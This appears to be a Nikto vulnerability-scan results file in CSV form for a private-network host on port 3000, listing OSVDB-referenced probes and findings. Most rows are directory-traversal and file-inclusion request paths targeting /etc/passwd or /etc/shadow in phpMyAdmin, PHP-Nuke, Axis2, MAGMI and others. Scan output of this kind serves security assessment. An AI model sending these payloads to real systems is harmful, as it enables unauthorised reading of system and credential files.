"Nikto - v2.1.6/2.1.5"
"192.168.1.142","192.168.1.142","3000","OSVDB-3800","GET","/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00","phpMyAdmin is vulnerable to a directory traversal attack."
"192.168.1.142","192.168.1.142","3000","OSVDB-3800","GET","/pma/export.php?what=../../../../../../../../../../../../etc/passwd%00","phpMyAdmin is vulnerable to a directory traversal attack."
"192.168.1.142","192.168.1.142","3000","OSVDB-383","GET","/~nobody/etc/passwd","Apache is misconfigured to view files by accessing ~nobody/filename. Change UserDir from './' to something else in httpd.conf."
"192.168.1.142","192.168.1.142","3000","OSVDB-3861","GET","/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00","This install of DCForum allows attackers to read arbitrary files on the host."
"192.168.1.142","192.168.1.142","3000","OSVDB-4191","GET","/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1","KorWebLog from http://weblog.kldp.org/ allows any file to be read on the system."
"192.168.1.142","192.168.1.142","3000","OSVDB-4775","GET","/shoutbox.php?conf=../../../../../../../etc/passwd","Webfroot Shoutbox 2.32 and below allows any file to be read from the system."
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-524","GET","/forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-543","GET","/opendir.php?/etc/passwd","This PHP-Nuke CGI allows attackers to read any file on the web server. CVE-2001-0321"
"192.168.1.142","192.168.1.142","3000","OSVDB-543","GET","/opendir.php?requesturl=/etc/passwd","This PHP-Nuke CGI allows attackers to read any file on the web server. CVE-2001-0321"
"192.168.1.142","192.168.1.142","3000","OSVDB-677","GET","/gallery/index.php?include=../../../../../../../../../etc/passwd","Gallery allows files to be read remotely. CVE-2001-0900."
"192.168.1.142","192.168.1.142","3000","OSVDB-677","GET","/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd","Gallery Addon for PHP-Nuke allows files to be read remotely. CVE-2001-0900."
"192.168.1.142","192.168.1.142","3000","OSVDB-694","GET","/phprocketaddin/?page=../../../../../../../../../../etc/passwd","The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/wp-app.log","Wordpress' wp-app.log may leak application/system details."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/wordpresswp-app.log","Wordpress' wp-app.log may leak application/system details."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/login.asp","Admin login page/section found."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/login.html","Admin login page/section found."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/login.php","Admin login page/section found."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/axis/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/imcws/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/WebServiceImpl/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/dswsbobje/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-59001","GET","/ws/services/Version?xsd=../../../../../../../../../../../etc/passwd","Apache Axis2 contains a directory traversal in the Version program."
"192.168.1.142","192.168.1.142","3000","OSVDB-18255","GET","/htdocs/../../../../../../../../../../../etc/passwd","SAP Internet Graphics Server (IGS) directory traversal"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/help/../../../../../../../../../../../../../../../../etc/shadow","TP-Link wireless routers directory traversal. See http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/Trace.axd","Trace.axd can reveal application or system details"
"192.168.1.142","192.168.1.142","3000","OSVDB-51887","GET","/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00","Horde local file retrieval (LFI) found. CVE-2009-0932."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/_profile/","Symfony Profiler may reveal sensitive application information."
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/flex2gateway/http","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/flex2gateway/httpsecure","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/flex2gateway/cfamfpoolling","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/flex2gateway/amf","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/flex2gateway/amfpolling","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/blazeds/messagebroker/http","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/samples/messagebroker/http","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/lcds/messagebroker/httpsecure","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/lcds-samples/messagebroker/http","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-62292","GET","/lcds-samples/messagebroker/httpsecure","Adobe BlazeDS is vulnerable to an XXE (CVE-2009-3960)"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/rails/info/properties/","The Ruby on Rails status page may reveal the version of RoR and further details on this host."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/rails/info/routes/","The Ruby on Rails routes page may reveal all available routes on this host."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-118103","GET","/shop/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility","MAGMI allows any file to be retrieved remotely (CVE-2015-2067)."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/magento/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/magento/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/shop/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/shop/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd","MAGMI allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","POST","/scgi-bin/platform.cgi","Devices with Cisco http firewall are prone to a local file inclusion. See: https://www.exploit-db.com/exploits/39184/"
